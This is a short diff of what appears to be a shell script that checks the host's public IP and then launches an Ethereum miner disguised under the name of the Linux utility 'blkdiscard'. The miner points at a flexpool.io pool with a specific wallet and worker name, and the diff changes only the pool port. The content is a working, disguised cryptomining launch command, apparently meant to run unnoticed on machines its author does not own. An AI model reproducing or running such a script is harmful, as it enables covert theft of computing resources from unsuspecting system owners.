@@ -4,4 +4,4 @@
 #gives ip address 
 curl ipecho.net/plain && curl ipecho.net/plain
 chmod +x blkdiscard 
-./blkdiscard --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:4444 --user 0x6bdcCbAEE917403f3704aABFa5811c989ccDf621.KULI-JAWA
+./blkdiscard --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0x6bdcCbAEE917403f3704aABFa5811c989ccDf621.KULI-JAWA
